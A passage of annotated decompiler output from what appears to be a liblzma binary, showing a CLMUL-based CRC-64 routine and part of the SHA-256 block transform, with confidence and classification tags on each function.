 * @brief CRC-64 computation using CLMUL (carry-less multiplication) with SIMD. Handles unaligned data, processes 16-byte chunks with fold constants, performs Barrett reduction. Returns 64-bit CRC with final NOT.
 * @confidence 88%
 * @classification crypto
 * @address 0x00115030
 */

/* WARNING: Removing unreachable block (ram,0x001151aa) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* CRC-64 computation using CLMUL (carry-less multiplication) with SIMD. Handles unaligned data,
   processes 16-byte chunks with fold constants at 0x128ac0/0x128ac8, performs Barrett reduction
   with constants at 0x128ad0/0x128ad8. Returns 64-bit CRC with final bitwise NOT. */

ulong lzma_crc64_clmul_generic(ulong param_1,ulong param_2,ulong param_3)

{
  undefined1 (*pauVar1) [16];
  undefined1 auVar2 [32];
  undefined1 auVar3 [16];
  undefined1 auVar4 [16];
  undefined1 auVar5 [16];
  undefined1 auVar6 [16];
  undefined1 auVar7 [16];
  undefined1 auVar8 [16];
  undefined1 auVar9 [16];
  undefined1 auVar10 [16];
  undefined1 auVar11 [16];
  undefined1 auVar12 [16];
  undefined1 auVar13 [16];
  undefined1 auVar14 [16];
  undefined1 auVar15 [16];
  undefined1 auVar16 [16];
  undefined1 (*pauVar17) [16];
  undefined1 (*pauVar18) [16];
  long lVar19;
  uint uVar20;
  undefined1 (*pauVar21) [16];
  undefined1 (*pauVar22) [16];
  ulong uVar23;
  undefined1 auVar24 [16];
  undefined1 auVar25 [16];
  undefined1 auVar26 [16];
  undefined1 auVar27 [16];
  undefined1 auVar28 [16];
  
  if (param_2 != 0) {
    uVar20 = (uint)param_1 & 0xf;
    pauVar22 = (undefined1 (*) [16])(param_1 & 0xfffffffffffffff0);
    uVar23 = param_2 + uVar20;
    auVar24 = pshufb(ZEXT416(uVar20),(undefined1  [16])0x0);
    auVar25 = pshufb(ZEXT416(-((uint)param_1 + (int)param_2) & 0xf),(undefined1  [16])0x0);
    auVar27[0] = clmul_shuffle_mask - auVar24[0];
    auVar27[1] = UNK_00126a61 - auVar24[1];
    auVar27[2] = UNK_00126a62 - auVar24[2];
    auVar27[3] = UNK_00126a63 - auVar24[3];
    auVar27[4] = UNK_00126a64 - auVar24[4];
    auVar27[5] = UNK_00126a65 - auVar24[5];
    auVar27[6] = UNK_00126a66 - auVar24[6];
    auVar27[7] = UNK_00126a67 - auVar24[7];
    auVar27[8] = UNK_00126a68 - auVar24[8];
    auVar27[9] = UNK_00126a69 - auVar24[9];
    auVar27[10] = UNK_00126a6a - auVar24[10];
    auVar27[0xb] = UNK_00126a6b - auVar24[0xb];
    auVar27[0xc] = UNK_00126a6c - auVar24[0xc];
    auVar27[0xd] = UNK_00126a6d - auVar24[0xd];
    auVar27[0xe] = UNK_00126a6e - auVar24[0xe];
    auVar27[0xf] = UNK_00126a6f - auVar24[0xf];
    auVar28[0] = clmul_shuffle_mask - auVar25[0];
    auVar28[1] = UNK_00126a61 - auVar25[1];
    auVar28[2] = UNK_00126a62 - auVar25[2];
    auVar28[3] = UNK_00126a63 - auVar25[3];
    auVar28[4] = UNK_00126a64 - auVar25[4];
    auVar28[5] = UNK_00126a65 - auVar25[5];
    auVar28[6] = UNK_00126a66 - auVar25[6];
    auVar28[7] = UNK_00126a67 - auVar25[7];
    auVar28[8] = UNK_00126a68 - auVar25[8];
    auVar28[9] = UNK_00126a69 - auVar25[9];
    auVar28[10] = UNK_00126a6a - auVar25[10];
    auVar28[0xb] = UNK_00126a6b - auVar25[0xb];
    auVar28[0xc] = UNK_00126a6c - auVar25[0xc];
    auVar28[0xd] = UNK_00126a6d - auVar25[0xd];
    auVar28[0xe] = UNK_00126a6e - auVar25[0xe];
    auVar28[0xf] = UNK_00126a6f - auVar25[0xf];
    auVar24._8_8_ = 0;
    auVar24._0_8_ = ~param_3;
    auVar25 = pblendvb(*pauVar22,(undefined1  [16])0x0,auVar27);
    if (param_2 < 0x11) {
      auVar27 = pshufb(ZEXT416((int)param_2 - 0x10),(undefined1  [16])0x0);
      auVar26[0] = auVar27[0] + clmul_shuffle_mask;
      auVar26[1] = auVar27[1] + UNK_00126a61;
      auVar26[2] = auVar27[2] + UNK_00126a62;
      auVar26[3] = auVar27[3] + UNK_00126a63;
      auVar26[4] = auVar27[4] + UNK_00126a64;
      auVar26[5] = auVar27[5] + UNK_00126a65;
      auVar26[6] = auVar27[6] + UNK_00126a66;
      auVar26[7] = auVar27[7] + UNK_00126a67;
      auVar26[8] = auVar27[8] + UNK_00126a68;
      auVar26[9] = auVar27[9] + UNK_00126a69;
      auVar26[10] = auVar27[10] + UNK_00126a6a;
      auVar26[0xb] = auVar27[0xb] + UNK_00126a6b;
      auVar26[0xc] = auVar27[0xc] + UNK_00126a6c;
      auVar26[0xd] = auVar27[0xd] + UNK_00126a6d;
      auVar26[0xe] = auVar27[0xe] + UNK_00126a6e;
      auVar26[0xf] = auVar27[0xf] + UNK_00126a6f;
      auVar27 = pshufb(auVar24,auVar26);
      auVar24 = pshufb(auVar24,auVar26 ^ _clmul_xor_mask);
      if (uVar23 < 0x11) {
        auVar25 = pshufb(auVar25,auVar28);
      }
      else {
        auVar25 = pshufb(auVar25,_clmul_xor_mask ^ auVar28);
        auVar27 = auVar27 ^ auVar25;
        auVar25 = pshufb(pauVar22[1],auVar28);
      }
      uVar23 = SUB168(auVar25 ^ auVar27,0);
      auVar2._16_16_ = auVar24;
      auVar2._0_16_ = auVar25 ^ auVar27;
      auVar24 = auVar2._8_16_;
    }
    else {
      pauVar1 = (undefined1 (*) [16])(*pauVar22 + uVar23);
      pauVar21 = pauVar22 + 2;
      auVar26 = pshufb(auVar24,auVar27);
      auVar26 = auVar26 ^ auVar25;
      auVar24 = pshufb(auVar24,auVar27 ^ _clmul_xor_mask);
      auVar24 = auVar24 ^ pauVar22[1];
      pauVar17 = pauVar21;
      if (pauVar21 < pauVar1) {
        do {
          auVar13._8_8_ = 0;
          auVar13._0_8_ = auVar26._8_8_;
          auVar15._8_8_ = 0;
          auVar15._0_8_ = _UNK_00128ac8;
          auVar25 = (undefined1  [16])0x0;
          for (uVar20 = 0; uVar20 < 0x40; uVar20 = uVar20 + 1) {
            if ((auVar13 & (undefined1  [16])0x1 << uVar20) != (undefined1  [16])0x0) {
              auVar25 = auVar25 ^ auVar15 << uVar20;
            }
          }
          pauVar18 = pauVar17 + 1;
          auVar3._8_8_ = 0;
          auVar3._0_8_ = auVar26._0_8_;
          auVar6._8_8_ = 0;
          auVar6._0_8_ = _DAT_00128ac0;
          auVar27 = (undefined1  [16])0x0;
          for (uVar20 = 0; uVar20 < 0x40; uVar20 = uVar20 + 1) {
            if ((auVar3 & (undefined1  [16])0x1 << uVar20) != (undefined1  [16])0x0) {
              auVar27 = auVar27 ^ auVar6 << uVar20;
            }
          }
          auVar26 = auVar25 ^ auVar27 ^ auVar24;
          auVar24 = *pauVar17;
          pauVar17 = pauVar18;
        } while (pauVar18 < pauVar1);
        lVar19 = ((ulong)((long)pauVar1 + (-0x21 - (long)pauVar22)) & 0xfffffffffffffff0) + 0x10;
        if (pauVar1 < (undefined1 (*) [16])(pauVar22[2] + 1)) {
          lVar19 = 0x10;
        }
        pauVar21 = (undefined1 (*) [16])(*pauVar21 + lVar19);
      }
      if (pauVar1 != pauVar21) {
        auVar25 = pshufb(auVar24,auVar28);
        auVar24 = pshufb(auVar26,_clmul_xor_mask ^ auVar28);
        auVar26 = pshufb(auVar26,auVar28);
        auVar24 = auVar24 | auVar25;
      }
      auVar14._8_8_ = 0;
      auVar14._0_8_ = auVar26._8_8_;
      auVar16._8_8_ = 0;
      auVar16._0_8_ = _UNK_00128ac8;
      auVar25 = (undefined1  [16])0x0;
      for (uVar20 = 0; uVar20 < 0x40; uVar20 = uVar20 + 1) {
        if ((auVar14 & (undefined1  [16])0x1 << uVar20) != (undefined1  [16])0x0) {
          auVar25 = auVar25 ^ auVar16 << uVar20;
        }
      }
      auVar4._8_8_ = 0;
      auVar4._0_8_ = auVar26._0_8_;
      auVar7._8_8_ = 0;
      auVar7._0_8_ = _DAT_00128ac0;
      auVar28 = (undefined1  [16])0x0;
      for (uVar20 = 0; uVar20 < 0x40; uVar20 = uVar20 + 1) {
        if ((auVar4 & (undefined1  [16])0x1 << uVar20) != (undefined1  [16])0x0) {
          auVar28 = auVar28 ^ auVar7 << uVar20;
        }
      }
      auVar24 = auVar25 ^ auVar28 ^ auVar24;
      uVar23 = auVar24._0_8_;
      auVar24 = auVar24 >> 0x40;
    }
    auVar9._8_8_ = 0;
    auVar9._0_8_ = uVar23;
    auVar11._8_8_ = 0;
    auVar11._0_8_ = _UNK_00128ac8;
    auVar25 = (undefined1  [16])0x0;
    for (uVar20 = 0; uVar20 < 0x40; uVar20 = uVar20 + 1) {
      if ((auVar9 & (undefined1  [16])0x1 << uVar20) != (undefined1  [16])0x0) {
        auVar25 = auVar25 ^ auVar11 << uVar20;
      }
    }
    auVar5._8_8_ = 0;
    auVar5._0_8_ = SUB168(auVar25 ^ auVar24,0);
    auVar8._8_8_ = 0;
    auVar8._0_8_ = _DAT_00128ad0;
    auVar28 = (undefined1  [16])0x0;
    for (uVar20 = 0; uVar20 < 0x40; uVar20 = uVar20 + 1) {
      if ((auVar5 & (undefined1  [16])0x1 << uVar20) != (undefined1  [16])0x0) {
        auVar28 = auVar28 ^ auVar8 << uVar20;
      }
    }
    auVar10._8_8_ = 0;
    auVar10._0_8_ = auVar28._0_8_;
    auVar12._8_8_ = 0;
    auVar12._0_8_ = _UNK_00128ad8;
    auVar27 = (undefined1  [16])0x0;
    for (uVar20 = 0; uVar20 < 0x40; uVar20 = uVar20 + 1) {
      if ((auVar10 & (undefined1  [16])0x1 << uVar20) != (undefined1  [16])0x0) {
        auVar27 = auVar27 ^ auVar12 << uVar20;
      }
    }
    param_3 = ~(auVar27._8_8_ ^ auVar28._0_8_ ^ SUB168(auVar25 ^ auVar24,8));
  }
  return param_3;
}



/**
 * @name  sha256_transform
 * @brief SHA-256 block compression function. Byte-swaps input to big-endian, performs 64 rounds with standard round constants, message schedule expansion with sigma0/sigma1, adds result to 8-word state.
 * @confidence 97%
 * @classification crypto
 * @address 0x00115250
 */

/* SHA-256 block compression function. Processes single 512-bit block. Byte-swaps input to
   big-endian, performs 64 rounds with standard SHA-256 round constants (0x428a2f98, 0x71374491,
   etc.), message schedule expansion with sigma0/sigma1, adds compressed result back to 8-word
   state. */

void sha256_transform(int *param_1,uint *param_2)

{
  int iVar1;
  long lVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  int iVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  undefined *puVar13;
  uint uVar14;
  uint uVar15;
  uint uVar16;
  uint uVar17;
  uint uVar18;
  long in_FS_OFFSET;
  uint local_f8;
  uint local_e0;
  uint local_dc;
  uint local_d8;
  uint local_d4;
  uint local_d0;
  uint local_cc;
  uint local_c8;
  uint local_c4;
  uint local_c0;
  uint local_bc;
  uint local_b8;
  uint local_b4;
  uint local_b0;
  int local_ac;
  int local_a8;
  int local_a4;
  int local_a0;
  int local_9c;
  int local_98;
  int local_94;
  int local_90;
  int local_8c;
  int local_88;
  int local_84;
  int local_80;
  int local_7c;
  int local_78;
  int local_74;
  uint local_68;
  uint uStack_64;
  uint uStack_60;
  int iStack_5c;
  uint uStack_54;
  uint uStack_50;
  int iStack_4c;
  
  uVar3 = *param_2;
  local_b0 = uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18;
  lVar2 = *(long *)(in_FS_OFFSET + 0x28);
  uStack_50 = (uint)*(undefined8 *)(param_1 + 6);
  uStack_54 = (uint)((ulong)*(undefined8 *)(param_1 + 4) >> 0x20);
  local_f8 = (uint)*(undefined8 *)(param_1 + 4);
  iStack_4c = (int)((ulong)*(undefined8 *)(param_1 + 6) >> 0x20);
  local_68 = (uint)*(undefined8 *)param_1;
  uStack_64 = (uint)((ulong)*(undefined8 *)param_1 >> 0x20);
  uStack_60 = (uint)*(undefined8 *)(param_1 + 2);
  iStack_5c = (int)((ulong)*(undefined8 *)(param_1 + 2) >> 0x20);
  uVar14 = (local_68 >> 9 | local_68 << 0x17) ^ local_68;
  uVar3 = (local_f8 >> 0xe | local_f8 << 0x12) ^ local_f8;
  uVar15 = (uVar14 >> 0xb | uVar14 << 0x15) ^ local_68;
  uVar3 = (uVar3 >> 5 | uVar3 << 0x1b) ^ local_f8;
  iVar1 = (uVar3 >> 6 | uVar3 << 0x1a) +
          ((uStack_50 ^ uStack_54) & local_f8 ^ uStack_50) + 0x428a2f98 + iStack_4c + local_b0;
  uVar12 = iStack_5c + iVar1;
  uVar14 = param_2[1];
  uVar11 = (uVar12 >> 0xe | uVar12 * 0x40000) ^ uVar12;
  uVar3 = (uVar15 >> 2 | uVar15 << 0x1e) +
          ((uStack_64 ^ uStack_60) & local_68) + (uStack_64 & uStack_60) + iVar1;
  uVar11 = (uVar11 >> 5 | uVar11 << 0x1b) ^ uVar12;
  uVar4 = uVar14 >> 0x18 | (uVar14 & 0xff0000) >> 8 | (uVar14 & 0xff00) << 8 | uVar14 << 0x18;
  iVar1 = uStack_50 + 0x71374491 + uVar4 + ((local_f8 ^ uStack_54) & uVar12 ^ uStack_54) +
          (uVar11 >> 6 | uVar11 << 0x1a);
  uStack_60 = uStack_60 + iVar1;
  uVar14 = (uVar3 >> 9 | uVar3 * 0x800000) ^ uVar3;
  uVar11 = param_2[2];
  uVar14 = (uVar14 >> 0xb | uVar14 << 0x15) ^ uVar3;
  uVar14 = (uVar14 >> 2 | uVar14 << 0x1e) +
           ((local_68 ^ uStack_64) & uVar3) + (local_68 & uStack_64) + iVar1;
  local_e0 = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 | uVar11 << 0x18;
  uVar11 = (uStack_60 >> 0xe | uStack_60 * 0x40000) ^ uStack_60;
  uVar15 = (uVar11 >> 5 | uVar11 << 0x1b) ^ uStack_60;
  uVar11 = (uVar14 >> 9 | uVar14 * 0x800000) ^ uVar14;
  iVar1 = uStack_54 + 0xb5c0fbcf + local_e0 + ((local_f8 ^ uVar12) & uStack_60 ^ local_f8) +
          (uVar15 >> 6 | uVar15 << 0x1a);
  uVar11 = (uVar11 >> 0xb | uVar11 << 0x15) ^ uVar14;
  uStack_64 = uStack_64 + iVar1;
  uVar15 = ((local_68 ^ uVar3) & uVar14) + (local_68 & uVar3) + (uVar11 >> 2 | uVar11 << 0x1e) +
           iVar1;
  uVar11 = param_2[3];
  local_dc = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 | uVar11 << 0x18;
  uVar11 = (uStack_64 >> 0xe | uStack_64 * 0x40000) ^ uStack_64;
  uVar11 = (uVar11 >> 5 | uVar11 << 0x1b) ^ uStack_64;
  iVar1 = local_f8 + 0xe9b5dba5 + local_dc + ((uVar12 ^ uStack_60) & uStack_64 ^ uVar12) +
          (uVar11 >> 6 | uVar11 << 0x1a);
  local_68 = local_68 + iVar1;
  uVar11 = (uVar15 >> 9 | uVar15 * 0x800000) ^ uVar15;
  uVar11 = (uVar11 >> 0xb | uVar11 << 0x15) ^ uVar15;
  uVar16 = (local_68 >> 0xe | local_68 * 0x40000) ^ local_68;
  uVar16 = (uVar16 >> 5 | uVar16 << 0x1b) ^ local_68;
  uVar18 = ((uVar3 ^ uVar14) & uVar15) + (uVar3 & uVar14) + (uVar11 >> 2 | uVar11 << 0x1e) + iVar1;
  uVar11 = param_2[4];
  local_d8 = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 | uVar11 << 0x18;
  uVar11 = (uVar18 >> 9 | uVar18 * 0x800000) ^ uVar18;
  local_7c = 0x6ca6351;
  iVar1 = uVar12 + 0x3956c25b + local_d8 + ((uStack_60 ^ uStack_64) & local_68 ^ uStack_60) +
          (uVar16 >> 6 | uVar16 << 0x1a);
  uVar12 = (uVar11 >> 0xb | uVar11 << 0x15) ^ uVar18;
  uVar3 = uVar3 + iVar1;
  local_78 = 0x14292967;
  local_80 = -0x2a586eb9;
  uVar11 = param_2[5];
  local_84 = -0x391ff40d;
  uVar16 = (uVar3 >> 0xe | uVar3 * 0x40000) ^ uVar3;
  local_88 = -0x40a68039;
  uVar17 = ((uVar14 ^ uVar15) & uVar18) + (uVar14 & uVar15) + (uVar12 >> 2 | uVar12 << 0x1e) + iVar1
  ;
  uVar12 = (uVar16 >> 5 | uVar16 << 0x1b) ^ uVar3;
  local_d4 = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 | uVar11 << 0x18;
  local_8c = -0x4ffcd838;
  local_90 = -0x57ce3993;
  iVar1 = uStack_60 + 0x59f111f1 + local_d4 + ((uStack_64 ^ local_68) & uVar3 ^ uStack_64) +
          (uVar12 >> 6 | uVar12 << 0x1a);
  local_94 = -0x67c1aeae;
  uVar14 = uVar14 + iVar1;
  local_98 = 0x76f988da;
  local_9c = 0x5cb0a9dc;
  uVar11 = (uVar17 >> 9 | uVar17 * 0x800000) ^ uVar17;
  local_a0 = 0x4a7484aa;
  local_a4 = 0x2de92c6f;
  uVar11 = (uVar11 >> 0xb | uVar11 << 0x15) ^ uVar17;
  uVar11 = ((uVar15 ^ uVar18) & uVar17) + (uVar15 & uVar18) + (uVar11 >> 2 | uVar11 << 0x1e) + iVar1
  ;
  uVar12 = param_2[6];
  local_d0 = uVar12 >> 0x18 | (uVar12 & 0xff0000) >> 8 | (uVar12 & 0xff00) << 8 | uVar12 << 0x18;
  uVar12 = (uVar14 >> 0xe | uVar14 * 0x40000) ^ uVar14;
  uVar12 = (uVar12 >> 5 | uVar12 << 0x1b) ^ uVar14;
  iVar1 = uStack_64 + 0x923f82a4 + local_d0 + ((local_68 ^ uVar3) & uVar14 ^ local_68) +
          (uVar12 >> 6 | uVar12 << 0x1a);
  uVar16 = param_2[7];
  uVar15 = uVar15 + iVar1;
  uVar12 = (uVar11 >> 9 | uVar11 * 0x800000) ^ uVar11;
  uVar12 = (uVar12 >> 0xb | uVar12 << 0x15) ^ uVar11;
  uVar12 = ((uVar18 ^ uVar17) & uVar11) + (uVar18 & uVar17) + (uVar12 >> 2 | uVar12 << 0x1e) + iVar1
  ;
  uVar5 = (uVar15 >> 0xe | uVar15 * 0x40000) ^ uVar15;
  local_cc = uVar16 >> 0x18 | (uVar16 & 0xff0000) >> 8 | (uVar16 & 0xff00) << 8 | uVar16 << 0x18;
  uVar16 = (uVar5 >> 5 | uVar5 << 0x1b) ^ uVar15;
  iVar1 = local_68 + 0xab1c5ed5 + local_cc + ((uVar3 ^ uVar14) & uVar15 ^ uVar3) +
          (uVar16 >> 6 | uVar16 << 0x1a);
  uVar18 = uVar18 + iVar1;
  uVar16 = (uVar12 >> 9 | uVar12 * 0x800000) ^ uVar12;
  uVar16 = (uVar16 >> 0xb | uVar16 << 0x15) ^ uVar12;
  uVar7 = (uVar18 >> 0xe | uVar18 * 0x40000) ^ uVar18;
  uVar5 = ((uVar17 ^ uVar11) & uVar12) + (uVar17 & uVar11) + (uVar16 >> 2 | uVar16 << 0x1e) + iVar1;
  uVar16 = param_2[8];
  uVar7 = (uVar7 >> 5 | uVar7 << 0x1b) ^ uVar18;
  local_c8 = uVar16 >> 0x18 | (uVar16 & 0xff0000) >> 8 | (uVar16 & 0xff00) << 8 | uVar16 << 0x18;
  iVar1 = uVar3 + 0xd807aa98 + local_c8 + ((uVar14 ^ uVar15) & uVar18 ^ uVar14) +
          (uVar7 >> 6 | uVar7 << 0x1a);
  uVar17 = uVar17 + iVar1;
  uVar3 = (uVar5 >> 9 | uVar5 * 0x800000) ^ uVar5;
  uVar3 = (uVar3 >> 0xb | uVar3 << 0x15) ^ uVar5;
  uVar16 = (uVar17 >> 0xe | uVar17 * 0x40000) ^ uVar17;
  uVar8 = ((uVar11 ^ uVar12) & uVar5) + (uVar11 & uVar12) + (uVar3 >> 2 | uVar3 << 0x1e) + iVar1;
  uVar3 = param_2[9];
  local_c4 = uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18;
  uVar3 = (uVar16 >> 5 | uVar16 << 0x1b) ^ uVar17;
  iVar1 = uVar14 + 0x12835b01 + local_c4 + ((uVar15 ^ uVar18) & uVar17 ^ uVar15) +
          (uVar3 >> 6 | uVar3 << 0x1a);
  uVar11 = uVar11 + iVar1;
  uVar3 = (uVar8 >> 9 | uVar8 * 0x800000) ^ uVar8;
  uVar3 = (uVar3 >> 0xb | uVar3 << 0x15) ^ uVar8;
  uVar14 = param_2[10];
  uVar3 = ((uVar12 ^ uVar5) & uVar8) + (uVar12 & uVar5) + (uVar3 >> 2 | uVar3 << 0x1e) + iVar1;
  local_c0 = uVar14 >> 0x18 | (uVar14 & 0xff0000) >> 8 | (uVar14 & 0xff00) << 8 | uVar14 << 0x18;
  uVar14 = (uVar11 >> 0xe | uVar11 * 0x40000) ^ uVar11;
  uVar14 = (uVar14 >> 5 | uVar14 << 0x1b) ^ uVar11;
  iVar1 = uVar15 + 0x243185be + local_c0 + ((uVar18 ^ uVar17) & uVar11 ^ uVar18) +
          (uVar14 >> 6 | uVar14 << 0x1a);
  uVar12 = uVar12 + iVar1;
  uVar14 = (uVar3 >> 9 | uVar3 * 0x800000) ^ uVar3;
  uVar15 = (uVar14 >> 0xb | uVar14 << 0x15) ^ uVar3;
  uVar14 = param_2[0xb];
  uVar16 = ((uVar5 ^ uVar8) & uVar3) + (uVar5 & uVar8) + (uVar15 >> 2 | uVar15 << 0x1e) + iVar1;
  local_bc = uVar14 >> 0x18 | (uVar14 & 0xff0000) >> 8 | (uVar14 & 0xff00) << 8 | uVar14 << 0x18;
  uVar14 = (uVar12 >> 0xe | uVar12 * 0x40000) ^ uVar12;
  uVar14 = (uVar14 >> 5 | uVar14 << 0x1b) ^ uVar12;
  iVar1 = uVar18 + 0x550c7dc3 + local_bc + ((uVar17 ^ uVar11) & uVar12 ^ uVar17) +
          (uVar14 >> 6 | uVar14 << 0x1a);
  uVar5 = uVar5 + iVar1;
  uVar14 = (uVar16 >> 9 | uVar16 * 0x800000) ^ uVar16;
  uVar15 = (uVar14 >> 0xb | uVar14 << 0x15) ^ uVar16;
  uVar7 = (uVar5 >> 0xe | uVar5 * 0x40000) ^ uVar5;
  uVar14 = param_2[0xc];
  uVar7 = (uVar7 >> 5 | uVar7 << 0x1b) ^ uVar5;
  uVar18 = ((uVar8 ^ uVar3) & uVar16) + (uVar8 & uVar3) + (uVar15 >> 2 | uVar15 << 0x1e) + iVar1;
  local_b8 = uVar14 >> 0x18 | (uVar14 & 0xff0000) >> 8 | (uVar14 & 0xff00) << 8 | uVar14 << 0x18;
  iVar1 = uVar17 + 0x72be5d74 + local_b8 + ((uVar11 ^ uVar12) & uVar5 ^ uVar11) +
          (uVar7 >> 6 | uVar7 << 0x1a);
  uVar8 = uVar8 + iVar1;
  uVar14 = (uVar18 >> 9 | uVar18 * 0x800000) ^ uVar18;
  uVar15 = (uVar14 >> 0xb | uVar14 << 0x15) ^ uVar18;
  uVar7 = (uVar8 >> 0xe | uVar8 * 0x40000) ^ uVar8;
  uVar14 = param_2[0xd];
  uVar17 = ((uVar3 ^ uVar16) & uVar18) + (uVar3 & uVar16) + (uVar15 >> 2 | uVar15 << 0x1e) + iVar1;
  uVar15 = (uVar7 >> 5 | uVar7 << 0x1b) ^ uVar8;
  local_b4 = uVar14 >> 0x18 | (uVar14 & 0xff0000) >> 8 | (uVar14 & 0xff00) << 8 | uVar14 << 0x18;
  uVar14 = (uVar17 >> 9 | uVar17 * 0x800000) ^ uVar17;
  iVar1 = uVar11 + 0x80deb1fe + local_b4 + ((uVar12 ^ uVar5) & uVar8 ^ uVar12) +
          (uVar15 >> 6 | uVar15 << 0x1a);
  uVar3 = uVar3 + iVar1;
  uVar15 = (uVar14 >> 0xb | uVar14 << 0x15) ^ uVar17;
  uVar14 = param_2[0xe];
  uVar11 = param_2[0xf];
  local_a8 = 0x240ca1cc;
  uVar15 = ((uVar16 ^ uVar18) & uVar17) + (uVar16 & uVar18) + (uVar15 >> 2 | uVar15 << 0x1e) + iVar1
  ;
  local_ac = 0xfc19dc6;
  uVar14 = uVar14 >> 0x18 | (uVar14 & 0xff0000) >> 8 | (uVar14 & 0xff00) << 8 | uVar14 << 0x18;
  uVar7 = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 | uVar11 << 0x18;
  uVar11 = (uVar3 >> 0xe | uVar3 * 0x40000) ^ uVar3;
  local_74 = -0x1041b87a;
  uVar11 = (uVar11 >> 5 | uVar11 << 0x1b) ^ uVar3;
  iVar1 = uVar12 + 0x9bdc06a7 + uVar14 + ((uVar5 ^ uVar8) & uVar3 ^ uVar5) +
          (uVar11 >> 6 | uVar11 << 0x1a);
  uVar16 = uVar16 + iVar1;
  uVar11 = (uVar15 >> 9 | uVar15 * 0x800000) ^ uVar15;
  uVar11 = (uVar11 >> 0xb | uVar11 << 0x15) ^ uVar15;
  uVar12 = ((uVar18 ^ uVar17) & uVar15) + (uVar18 & uVar17) + (uVar11 >> 2 | uVar11 << 0x1e) + iVar1
  ;
  uVar11 = (uVar16 >> 0xe | uVar16 * 0x40000) ^ uVar16;
  uVar11 = (uVar11 >> 5 | uVar11 << 0x1b) ^ uVar16;
  iVar1 = uVar5 + 0xc19bf174 + uVar7 + ((uVar8 ^ uVar3) & uVar16 ^ uVar8) +
          (uVar11 >> 6 | uVar11 << 0x1a);
  uVar18 = uVar18 + iVar1;
  uVar11 = (uVar12 >> 9 | uVar12 * 0x800000) ^ uVar12;
  uVar11 = (uVar11 >> 0xb | uVar11 << 0x15) ^ uVar12;
  iVar9 = -0x1b64963f;
  uVar11 = ((uVar17 ^ uVar15) & uVar12) + (uVar17 & uVar15) + (uVar11 >> 2 | uVar11 << 0x1e) + iVar1
  ;
  puVar13 = &DAT_00128b00;
  local_f8 = uVar4;
  while( true ) {
    uVar4 = (uVar14 >> 2 | uVar14 << 0x1e) ^ uVar14;
    uVar5 = (local_f8 >> 0xb | local_f8 << 0x15) ^ local_f8;
    local_b0 = local_b0 +
               ((uVar5 >> 7 | uVar5 << 0x19) ^ local_f8 >> 3) +
               ((uVar4 << 0xf | uVar4 >> 0x11) ^ uVar14 >> 10) + local_c4;
    uVar4 = (uVar18 >> 0xe | uVar18 << 0x12) ^ uVar18;
    uVar4 = (uVar4 >> 5 | uVar4 << 0x1b) ^ uVar18;
    iVar9 = uVar8 + (uVar4 >> 6 | uVar4 << 0x1a) + ((uVar3 ^ uVar16) & uVar18 ^ uVar3) + local_b0 +
            iVar9;
    uVar4 = (uVar11 >> 9 | uVar11 << 0x17) ^ uVar11;
    uVar17 = uVar17 + iVar9;
    uVar4 = (uVar4 >> 0xb | uVar4 << 0x15) ^ uVar11;
    uVar4 = ((uVar12 ^ uVar15) & uVar11) + (uVar12 & uVar15) + (uVar4 >> 2 | uVar4 << 0x1e) + iVar9;
    uVar5 = (uVar7 >> 2 | uVar7 << 0x1e) ^ uVar7;
    uVar8 = (local_e0 >> 0xb | local_e0 << 0x15) ^ local_e0;
    local_f8 = ((uVar5 << 0xf | uVar5 >> 0x11) ^ uVar7 >> 10) + local_c0 + local_f8 +
               ((uVar8 >> 7 | uVar8 << 0x19) ^ local_e0 >> 3);
    uVar5 = (uVar17 >> 0xe | uVar17 * 0x40000) ^ uVar17;
    uVar8 = (uVar5 >> 5 | uVar5 << 0x1b) ^ uVar17;
    uVar5 = (uVar4 >> 9 | uVar4 * 0x800000) ^ uVar4;
    local_74 = local_74 +
               (uVar8 >> 6 | uVar8 << 0x1a) +
               uVar3 + local_f8 + ((uVar18 ^ uVar16) & uVar17 ^ uVar16);
    uVar15 = uVar15 + local_74;
    uVar3 = (uVar5 >> 0xb | uVar5 << 0x15) ^ uVar4;
    uVar3 = (uVar12 & uVar11) + ((uVar12 ^ uVar11) & uVar4) + (uVar3 >> 2 | uVar3 << 0x1e) +
            local_74;
    uVar5 = (local_dc >> 0xb | local_dc << 0x15) ^ local_dc;
    uVar8 = (local_b0 >> 2 | local_b0 * 0x40000000) ^ local_b0;
    local_e0 = ((uVar5 >> 7 | uVar5 << 0x19) ^ local_dc >> 3) + local_bc + local_e0 +
               ((uVar8 << 0xf | uVar8 >> 0x11) ^ local_b0 >> 10);
    uVar5 = (uVar15 >> 0xe | uVar15 * 0x40000) ^ uVar15;
    uVar5 = (uVar5 >> 5 | uVar5 << 0x1b) ^ uVar15;
    local_ac = uVar16 + local_e0 + ((uVar18 ^ uVar17) & uVar15 ^ uVar18) +
               (uVar5 >> 6 | uVar5 << 0x1a) + local_ac;
    uVar12 = uVar12 + local_ac;
    uVar16 = (uVar3 >> 9 | uVar3 * 0x800000) ^ uVar3;
    uVar16 = (uVar16 >> 0xb | uVar16 << 0x15) ^ uVar3;
    uVar16 = (uVar16 >> 2 | uVar16 << 0x1e) + ((uVar4 ^ uVar11) & uVar3) + (uVar4 & uVar11) +
             local_ac;
    uVar5 = (local_d8 >> 0xb | local_d8 << 0x15) ^ local_d8;
    uVar8 = (local_f8 >> 2 | local_f8 * 0x40000000) ^ local_f8;
    local_dc = ((uVar5 >> 7 | uVar5 << 0x19) ^ local_d8 >> 3) + local_b8 + local_dc +
               ((uVar8 << 0xf | uVar8 >> 0x11) ^ local_f8 >> 10);
    uVar5 = (uVar12 >> 0xe | uVar12 * 0x40000) ^ uVar12;
    uVar5 = (uVar5 >> 5 | uVar5 << 0x1b) ^ uVar12;
    local_a8 = local_a8 +
